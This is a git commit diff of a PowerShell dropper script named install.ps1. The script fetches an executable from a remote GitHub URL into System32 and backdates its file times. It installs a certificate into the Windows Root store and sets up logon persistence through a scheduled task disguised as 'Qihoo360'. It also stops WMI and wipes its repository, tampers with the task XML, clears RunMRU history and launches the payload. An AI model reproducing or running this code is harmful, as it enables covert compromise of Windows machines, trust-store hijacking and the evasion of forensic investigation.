303912ef048f59d5cd554e467056f73236e4af5a
mhali43 <mohamedali43@tutamail.com>
2024-10-27 23:42:53 +0000

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,13 +1,13 @@
 $TargetPath = "C:\Windows\System32\st.exe"
 mkdir ("C:\Users\" + $env:USERNAME + "\AppData\Roaming\Data\fa7tr3b4awe9hnte563cdn324v3q4z36\")
-curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/st.exe" -o $TargetPath
+curl "https://raw.githubusercontent.com/mhali43/ps1/main/st.exe" -o $TargetPath
+echo "[+] Fetch"
 
 (Get-Item $TargetPath).CreationTime=("1 Jan 1999 0:00:00")
 (Get-Item $TargetPath).LastWriteTime=("1 Jan 1999 0:00:00")
 (Get-Item $TargetPath).LastAccessTime=("1 Jan 1999 0:00:00")
-echo "OK"
+echo "[+] Time"
 
-#cert
 $base64Cert = @"
 TUlJRHJUQ0NBcFdnQXdJQkFnSVVEOTM1Z1VMclcwTmxlRE15bzY1YXc5eHhRRkF3RFFZSktvWklodmNOQVFFTA0KQlFBd1pqRUxNQWtHQTFVRUJoTUNRMEV4Q3pBSkJnTlZCQWdNQWtKRE1SSXdFQVlEVlFRSERBbFdZVzVqYjNWMg0KWlhJeEZEQVNCZ05WQkFvTUMxUlVWQ0JUZEhWa2FXOXpNUXN3Q1FZRFZRUUxEQUpKVkRFVE1CRUdBMVVFQXd3Sw0KZEhSMExuTjBkV1JwYnpBZUZ3MHlOREE1TURZd01URTJNelJhRncweU56QTJNRE13TVRFMk16UmFNR1l4Q3pBSg0KQmdOVkJBWVRBa05CTVFzd0NRWURWUVFJREFKQ1F6RVNNQkFHQTFVRUJ3d0pWbUZ1WTI5MWRtVnlNUlF3RWdZRA0KVlFRS0RBdFVWRlFnVTNSMVpHbHZjekVMTUFrR0ExVUVDd3dDU1ZReEV6QVJCZ05WQkFNTUNuUjBkQzV6ZEhWaw0KYVc4d2dnRWlNQTBHQ1NxR1NJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUURVVEVwTld2WHVUOXRaQkhmSw0KekJGc0hlelE4bUpxUk51c1VmaVJrVHR2dDdQSXh5TFU0czdSQk1sK3N6L1cwKzZacGVhSklaZ1AyRTg0Y0lLVA0KTmhCQkcxZm14YURZM0luUVZHcDFtUnFKUDhHWEl1bER5dmI3d0UwL29VdU10emhPY21rMkMvM3V4MVgxdHMvKw0KOElSUkV5SStPKzhWZnlpTXNlbDFWR0lFZDloRC9GN3FmdE1mVW1qTytuTG41eUJTMy95L3JmejVPalZXR1RHdQ0Kb2I4bytmcGVLRVZoaW1ZRmJYZWpJSWR0eENkSXlqMGZXYjMxYllpUUlsSE5hTmFSeERCVUpjMkJJSHlrS3JRWA0KOVNvN0d3dEhobE1sREllUVlhSXJ0VG9XeDJoMFR0TmNzRHRkU2hVY2hzMCtpeHJXQktFZXQ2dHlYMnlzc1FHQw0KcE52L0FnTUJBQUdqVXpCUk1CMEdBMVVkRGdRV0JCU3IzU3BqSWo5b1NsRjNpNkQ3VHR3WDZkOWpIakFmQmdOVg0KSFNNRUdEQVdnQlNyM1NwaklqOW9TbEYzaTZEN1R0d1g2ZDlqSGpBUEJnTlZIUk1CQWY4RUJUQURBUUgvTUEwRw0KQ1NxR1NJYjNEUUVCQ3dVQUE0SUJBUUFMYlVxcDZiQmU1RmhvVDFsRHgrL3ZiV1VLVUt0TW1QUktZaUJLMmNXTw0KT2prSi8wL2hRRzhDTXhhS2hOQ0VBRjBaOEREREI5bmZxdFFIMXIveXdsblVRMk9kOU1lc2NFYnlMaHRISVRNcQ0KZ094ZTZuMW45aElBbDNDT2JPMW9wREZIMVdLTUc3WkxZRmE4ditaZmFVY0lIWElweWJyckxPR1ppa0xuWFYvaw0KdWZuZm5RU1dBZElKZlprNDUrMGE1SGtKaVRjVVIzWGtnL3U5aysya0VYbHdMOWNEcUY4NWFFVHlsYlV5Ky9IWg0KcTdicnUvNE5lVWYrL2FINHd0Z0VZaU1ZZ3ZxbzlJYkhjM1hFd2RHSkx6b1pMRTE3ejlWZXhrZTNhV3RHZ2E5Nw0KMHZ5Z0xrdW5uRWsrWEthVjhQQXVtd2U0cGpWdGF1NFp2aU13L3NzRE1nSnM=
 "@
@@ -22,9 +22,8 @@ $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Roo
 $store.Open("ReadWrite")
 $store.Add($cert)
 $store.Close()
-echo "OK cert"
+echo "[+] Cert"
 
-#persistance
 $TaskName = "Qihoo360"
 $Action = New-ScheduledTaskAction -Execute $TargetPath
 $Trigger = New-ScheduledTaskTrigger -AtLogon
@@ -35,9 +34,8 @@ Set-Service Winmgmt -StartupType Disabled
 Stop-Service -Force -Name Winmgmt
 
 Remove-Item -Path "C:\Windows\System32\wbem\Repository\*" -Recurse -Force
-echo "OK persistance"
+echo "[+] Presence"
 
-#alter xml
 $TaskPath = "C:\Windows\System32\tasks\" + $TaskName
 [xml]$xml = (Get-Content -Path $TaskPath -Encoding Unicode)
 if($xml.Task.RegistrationInfo.Date)
@@ -52,9 +50,8 @@ if($xml.Task.RegistrationInfo.Date)
 
 Set-Service Winmgmt -StartupType Automatic
 Start-Service -Name winmgmt
-echo "OK alter xml"
+echo "[+] XML"
 
-#clean 
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 $values = Get-ItemProperty -Path $regPath
 
@@ -66,7 +63,8 @@ foreach ($valueName in $values.PSObject.Properties.Name)
         echo $valueName
     }
 }
-echo "OK clean"
+echo "[+] Clean"
 
-#run
 Start-Process -FilePath $TargetPath 
+
+echo "[+] Started"
